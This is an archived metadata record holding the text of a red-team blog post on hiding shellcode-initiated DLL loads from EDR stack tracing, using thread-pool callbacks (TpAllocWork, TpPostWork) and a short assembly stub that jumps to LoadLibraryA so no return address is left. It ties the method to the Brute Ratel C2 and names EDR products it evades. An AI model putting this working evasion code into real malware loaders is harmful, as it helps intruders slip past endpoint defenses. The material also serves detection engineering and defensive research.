{
    "id": "6b626238-0d9f-4a16-ab88-f83e73cb3ab8",
    "created_at": "2023-03-03T02:05:45.547961Z",
    "updated_at": "2025-03-27T02:05:38.306475Z",
    "deleted_at": null,
    "sha1_hash": "92755004ebeb0f2571960d40601587bb9fe7b8f1",
    "title": "2023-01-26 - Hiding In PlainSight - Proxying DLL Loads To Hide From ETWTI Stack Tracing",
    "authors": "",
    "file_creation_date": "2023-03-01T09:33:54Z",
    "file_modification_date": "2023-03-01T09:33:54Z",
    "file_size": 550655,
    "plain_text": "# Hiding In PlainSight - Proxying DLL Loads To Hide From ETWTI Stack Tracing\n\n**[0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/](https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/)**\n\nPosted on 26 Jan 2023 by Paranoid Ninja\n\nNOTE: This is a PART I blog on Stack Tracing evasion. PART II can be found **_[here.](https://0xdarkvortex.dev/hiding-in-plainsight/)_**\n\nBeen a while since I actually wrote any blog on Dark Vortex (not counting the Brute Ratel\nones, just raw research), thus I decided to add the post here. This blog provides a high level\noverview on stack tracing, how EDR/AVs use it for detections, the usage of ETWTI telemetry\nand what can be done to evade it. Last year, I posted a [blog on Brute Ratel which was the](https://bruteratel.com/release/2022/07/20/Release-Stoffels-Escape/)\nfirst Command & Control to provide built-in proxying of DLL loads to avoid detections, which\nwas later on adopted by other C2s like nighthawk with a different set of APIs\n(RtlQueueWorkItem) to avoid detections. Thus, before we discuss evasion, lets first\nunderstand why stack tracing is important for EDRs.\n\n## What Is A Stack?\n\nThe simplest way to describe a ‘Stack’ in computer science, is a temporary memory space\nwhere local variables and function arguments are stored with non-executable permissions.\nThis stack can contain several information about a thread and the function in which it is being\nexecuted. Whenever your process executes a new thread, a new stack is created. Stack\ngrows from bottom to top and works in linear fashion, which means it follows the Last In, First\nOut principal. The ‘RSP’ (x64) or ‘ESP’ (x86) stores the current stack pointer of the thread.\n[Each new default stack size for a thread in windows is of 1 Megabyte unless explicitly](https://learn.microsoft.com/en-us/cpp/build/reference/stack-stack-allocations?view=msvc-170)\nchanged by the developer during the creation of the thread. This means, if the developer\ndoes not calculate and increase the stack size while coding, the stack might end up hitting\nthe stack boundary (alternative known as stack canary) and raise an exception. Usually, it is\nthe task of the _chkstk routine within msvcrt.dll to probe the stack, and raise an exception if\nmore stack is required. Thus if you write a position independent shellcode which requires a\nlarge stack (as everything in PIC is stored on stack), your shellcode will crash raising an\nexception since your PIC will not be linked to the _chkstk routine within msvcrt.dll. When\nyour thread starts, your thread might contain execution of several functions and usage of\nvarious different types of variables. Unlike heap, which needs to be allocated and freed\nmanually, we dont have to manually calculate the stack. When the compiler (mingw gcc or\nclang) compiles the C/C++ code, it auto calculates the stack required and adds the required\ninstruction in the code. Thus when your thread is run, it will first allocate the ‘x’ size on stack\nfrom the reserved stack of 1 MB. Take the below example for this instance:\n\n\n-----\n\n```\nvoid samplefunction() {\n\n  char test[8192];\n\n}\n\n```\nIn the above function, we are simply creating a variable of 8192 bytes, but this will not be\nstored within the PE as it will unnecessarily end up eating space on disk. Thus such\nvariables are optimized by compilers and converted to instructions such as:\n```\nsub rsp, 0x2000\n\n```\nThe above assembly code subtracts 0x2000 bytes (8192 decimal) from stack which will be\nutilized by the function during runtime. In short, if your code needs to clean up some stack\nspace, it will add bytes to stack, whereas if it requires some stack space, it will subtract from\nthe stack. Each function’s stack within the thread will be converted to a block which is called\nas stack frame. Stack frames provide a clear and concise view of which function was last\ncalled, from which area in memory, how much stack is being used by that frame, what are\nthe variables stored in the frame and where the current function needs to return to.\nEverytime your function calls another function, your current function’s address is pushed to\nstack, so that when the next function calls ‘ret’ or return, it returns to the current function’s\naddress to continue execution. Once your current function returns to the previous function,\nthe stack frame of the current function gets destroyed, not completely though, it can still be\naccessed, but mostly ends up being overwritten by the next function which gets called. To\nexplain it like I would to a 5 year old, it would go like this:\n```\nvoid func3() {\n\n  char test[2048];\n\n  // do something\n\n  return;\n\n}\n\nvoid func2() {\n\n  char test[4096];\n\n  func3();\n\n}\n\nvoid func1() {\n\n  char test[8192];\n\n  func2();\n\n}\n\n```\nThe above code gets converted to assembly like this:\n\n\n-----\n\n```\nfunc3:\n\n  sub rsp, 0x800\n\n  ; do something\n\n  add rsp, 0x800\n\n  ret\n\nfunc2:\n\n  sub rsp, 0x1000\n\n  call func3\n\n  add rsp, 0x1000\n\n  ret\n\nfunc1:\n\n  sub rsp, 0x2000\n\n  call func2\n\n  add rsp, 0x2000\n\n  ret\n\n```\nWell, a 5 year old wont understand it, but when do you find a 5 year old writing a malware\nright? XD! Thus, each stack frame will contain the number of bytes to allocate for variables,\nreturn address which pushed to stack by the previous function and information about current\nfunction’s local variables (in a nut shell).\n\n## Wheres THE ‘D’ in EDR here?\n\nThe technique for detection is extremely smart here. Some EDRs use userland hooks,\nwhereas some use ETW to capture the stack telemetry. For example, say you want to\nexecute your shellcode without module stomping. So, you allocate some memory via\nVirtualAlloc or the relative NTAPI NtAllocateVirtualMemory, then copy your shellcode and\nexecute it. Now your shellcode might have its own dependencies and it might call\n```\nLoadLibraryA or LdrLoadDll to load a dll from disk into memory. If your EDR uses userland\n\n```\nhooks, they might have already hooked LoadLibrary and LdrLoadDll, in which case they\ncan check the return address pushed to stack by your RX shellcode region. This is specific to\nsome EDRs like Sentinel One, Crowdstrike etc. which will instantly kill your payload. Other\nEDRs like Microsoft Defender ATP (MDATP), Elastic, FortiEDR will use ETW or kernel\ncallbacks to check where the LoadLibrary call originated from. The stack trace will provide a\ncomplete stack frame of return address and all the functions from where the call to\n```\nLoadLibrary started. In short, if you execute a DLL Sideload which executes your shellcode\n\n```\nwhich called LoadLibrary, it would look like this:\n\n\n-----\n\n```\n| Top Of The Stack |\n\n|                   |\n\n|                   |\n\n|--------------------------------------|\n\n|------Stack Frame of LoadLibrary------|\n\n|   Return address of RX on disk   |\n\n|                   |\n\n|----------Stack Frame of RX-----------| <- Detection (An unbacked RX region should\nnever call LoadLibraryA)\n\n|   Return address of PE on disk   |\n\n|                   |\n\n|-----------Stack Frame of PE----------|\n\n| Return address of RtlUserThreadStart |\n\n|                   |\n\n|---------Bottom Of The Stack----------|\n\n```\nThis means any EDR which hooks LoadLibrary in usermode or via kernel callbacks/ETW,\ncan check the last return address region or where the call came from. In the v1.1 release of\nBRc4, I started using the RtlRegisterWait API which can request a worker thread in thread\npool to execute LoadLibraryA in a seperate thread to load the library. Once the library is\nloaded, we can extract its base address by simply walking the PEB (Process Environment\nBlock). Nighthawk later adopted this technique to RtlQueueWorkItem API which is the main\nNTAPI behind QueueUserWorkItem which can also queue a request to a worker thread to\nload a library with a clean stack. However this was researched by Proofpoint sometime last\nyear in their blog, and lately Joe Desimone from Elastic also posted a tweet about the\n```\nRtlRegisterWait API being used by BRc4. This meant sooner or later, detections would\n\n```\ncome around it and there were need of more such APIs which can be used for further\nevasion. Thus I decided to spend some time reversing some undocumented APIs from ntdll\nand found atleast 27 different callbacks which, with a little tweaking and hacking can be\nexploited to load our DLL with a clean stack.\n\n## Windows Callbacks: Allow Us To Introduce Ourselves\n\nCallback functions are pointers to a function which can be passed on to other functions to be\nexecuted inside them. Microsoft provides an insane amount of callbacks for software\ndevelopers to execute code via other functions. A lot of these functions can be found in this\n[github repository which have been exploited quite widely since the past two years. However](https://github.com/aahmad097/AlternativeShellcodeExec)\nthere is a major issue with all those callbacks. When you execute a callback, you dont want\nthe callback to be in the same thread as of your caller thread. Which means, you dont want\nstack trace to follow a trail like: LoadLibrary returns to -> Callback Function returns\n```\nto -> RX region. In order to have a clean stack, we need to make sure our LoadLibrary\n\n```\nexecutes in a seperate thread independent of our RX region, and if we use callbacks, we\nneed the callbacks to be able to pass proper parameters to LoadLibraryA. Most callbacks in\nWindows, either dont have parameters, or dont forward the parameters ‘as is’ to our target\nfunction ‘LoadLibrary’. Take an example of the below code:\n\n\n-----\n\n```\n#include <windows.h>\n\n#include <stdio.h>\n\nint main() {\n\n  CHAR *libName = \"wininet.dll\";\n\n  PTP_WORK WorkReturn = NULL;\n\n  TpAllocWork(&WorkReturn, LoadLibraryA, libName, NULL); // pass `LoadLibraryA` as\na callback to TpAllocWork\n\n  TpPostWork(WorkReturn);                // request Allocated\nWorker Thread Execution\n\n  TpReleaseWork(WorkReturn);               // worker thread cleanup\n\n  WaitForSingleObject((HANDLE)-1, 1000);\n\n  printf(\"hWininet: %p\\n\", GetModuleHandleA(libName)); //check if library is loaded\n\n  return 0;\n\n}\n\n```\nIf you compile and run the above code, it will crash. The reason being the definition of\nTpAllocWork is:\n```\nNTSTATUS NTAPI TpAllocWork(\n\n  PTP_WORK* ptpWrk,\n\n  PTP_WORK_CALLBACK pfnwkCallback,\n\n  PVOID OptionalArg,\n\n  PTP_CALLBACK_ENVIRON CallbackEnvironment\n\n);\n\n```\nThis means our callback function LoadLibraryA should be of type [PTP_WORK_CALLBACK.](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms687396(v=vs.85))\nThis type expands to:\n```\nVOID CALLBACK WorkCallback(\n\n  PTP_CALLBACK_INSTANCE Instance,\n\n  PVOID Context,\n\n  PTP_WORK Work\n\n);\n\n```\nAs can be seen in the above figure, our PVOID OptionalArg from TpAllocWork API gets\nforwarded as secondary argument to our Callback (PVOID Context). So if our hypothesis is\ncorrect, the argument libName (wininet.dll) that we passed to TpAllocWork will end up\nas a second argument to our LoadLibraryA. But LoadLibraryA DOES NOT have a second\nargument. Checking this in debugger leads to the following image:\n\n\n-----\n\nSo this indeed created a clean stack like: LoadLibraryA returns to -> TpPostWork\n```\nreturns to -> RtlUserThreadStart, but our argument for LoadLibrary gets sent as the\n\n```\nsecond argument, whereas the first argument is a pointer to a TP_CALLBACK_INSTANCE\nstructure sent by the TpPostWork API. After a bit more reversing, I found that this structure is\ndynamically generated by the TppWorkPost (NOT TpPostWork), which as expected is an\ninternal function of ntdll.dll and nothing much can be done without having the debug symbols\nfor this API.\n\nHowever, all hope is not yet lost. One of the dirty tricks we can try is to replace a Callback\nfunction from LoadLibrary to a custom function in TpAllocWork which then calls\n```\nLoadLibraryA via our callback. Something like this:\n#include <windows.h>\n\n#include <stdio.h>\n\nVOID CALLBACK WorkCallback(\n\n _Inout_   PTP_CALLBACK_INSTANCE Instance,\n\n _Inout_opt_ PVOID         Context,\n\n _Inout_   PTP_WORK       Work\n\n) {\n\n  LoadLibraryA(Context);\n\n}\n\nint main() {\n\n  CHAR *libName = \"wininet.dll\";\n\n  PTP_WORK WorkReturn = NULL;\n\n  TpAllocWork(&WorkReturn, WorkerCallback, libName, NULL); // pass `LoadLibraryA`\nas a callback to TpAllocWork\n\n  TpPostWork(WorkReturn);                // request Allocated\nWorker Thread Execution\n\n  TpReleaseWork(WorkReturn);               // worker thread cleanup\n\n  WaitForSingleObject((HANDLE)-1, 1000);\n\n  printf(\"hWininet: %p\\n\", GetModuleHandleA(libName)); //check if library is loaded\n\n  return 0;\n\n}\n\n```\n\n-----\n\nHowever this means, the callback will be in our RX region and the stack would become:\n```\nLoadLibraryA returns to -> Callback in RX Region returns to ->\nRtlUserThreadStart -> TpPostWork which is not good as we ended up doing the same\n\n```\nthing we were trying to avoid. The reason for this is stack frame. Because when we call\n```\nLoadLibraryA from our Callback in RX Region, we end up pushing the return address of\n\n```\nthe Callback in RX Region on stack which ends up becoming a part of the stack frame.\nHowever, what if we manipulate the stack to NOT PUSH THE RETURN ADDRESS? Sure,\nwe will have to write a few lines in assembly, but this should solve our issue entirely and we\ncan have a direct call from TpPostWork to LoadLibrary without having the intricacies in\nbetween.\n\n**The Final Trick**\n```\n#include <windows.h>\n\n#include <stdio.h>\n\ntypedef NTSTATUS (NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK\npfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);\n\ntypedef VOID (NTAPI* TPPOSTWORK)(PTP_WORK);\n\ntypedef VOID (NTAPI* TPRELEASEWORK)(PTP_WORK);\n\nFARPROC pLoadLibraryA;\n\nUINT_PTR getLoadLibraryA() {\n\n  return (UINT_PTR)pLoadLibraryA;\n\n}\n\nextern VOID CALLBACK WorkCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context,\nPTP_WORK Work);\n\nint main() {\n\n  pLoadLibraryA = GetProcAddress(GetModuleHandleA(\"kernel32\"), \"LoadLibraryA\");\n\n  FARPROC pTpAllocWork = GetProcAddress(GetModuleHandleA(\"ntdll\"), \"TpAllocWork\");\n\n  FARPROC pTpPostWork = GetProcAddress(GetModuleHandleA(\"ntdll\"), \"TpPostWork\");\n\n  FARPROC pTpReleaseWork = GetProcAddress(GetModuleHandleA(\"ntdll\"),\n\"TpReleaseWork\");\n\n  CHAR *libName = \"wininet.dll\";\n\n  PTP_WORK WorkReturn = NULL;\n\n  ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)WorkCallback,\nlibName, NULL);\n\n  ((TPPOSTWORK)pTpPostWork)(WorkReturn);\n\n  ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);\n\n  WaitForSingleObject((HANDLE)-1, 0x1000);\n\n  printf(\"hWininet: %p\\n\", GetModuleHandleA(libName));\n\n  return 0;\n\n}\n\n```\n\n-----\n\n**ASM Code for rerouting WorkCallback to LoadLibrary by manipulating the stack frame**\n```\nsection .text\n\nextern getLoadLibraryA\n\nglobal WorkCallback\n\nWorkCallback:\n\n  mov rcx, rdx\n\n  xor rdx, rdx\n\n  call getLoadLibraryA\n\n  jmp rax\n\n```\nNow if you compile both of them together, our TpPostWork calls WorkCallback, but\n```\nWorkCallback does not call LoadLibraryA, it instead jumps to its pointer. WorkCallback\n\n```\nsimply moves the library name in the RDX register to RCX, erases RDX, gets the address of\n```\nLoadLibraryA from an adhoc function and then jumps to LoadLibraryA which ends up\n\n```\nrearranging the whole stack frame without adding our return address. This ends up making\nthe stack frame look like this:\n\nThe stack is clear as crystal with no signs of anything malevolent. After finding this\ntechnique, I started hunting similar other APIs which can be manipulated, and found that with\njust a little bit of similar tweaks, you can actually implement proxy DLL loads with 27 other\n```\nCallbacks residing in kernel32, kernelbase and ntdll. I will leave it out as an exercise for the\n\n```\nreaders of this blog to figure that out. For the users of Brute Ratel, you will find these updates\nin the next release v1.5. That would be all for this blog and the full code can be found in my\n[github repository.](https://github.com/paranoidninja/Proxy-DLL-Loads)\n\n[Tagged with: red-team](https://0xdarkvortex.dev/tags/red-team/) [blogs](https://0xdarkvortex.dev/tags/blogs/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-01-26 - Hiding In PlainSight - Proxying DLL Loads To Hide From ETWTI Stack Tracing.pdf"
    ],
    "report_names": [
        "2023-01-26 - Hiding In PlainSight - Proxying DLL Loads To Hide From ETWTI Stack Tracing.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1677809145,
    "ts_updated_at": 1743041138,
    "ts_creation_date": 1677663234,
    "ts_modification_date": 1677663234,
    "files": {
        "pdf": "https://archive.orkl.eu/92755004ebeb0f2571960d40601587bb9fe7b8f1.pdf",
        "text": "https://archive.orkl.eu/92755004ebeb0f2571960d40601587bb9fe7b8f1.txt",
        "img": "https://archive.orkl.eu/92755004ebeb0f2571960d40601587bb9fe7b8f1.jpg"
    }
}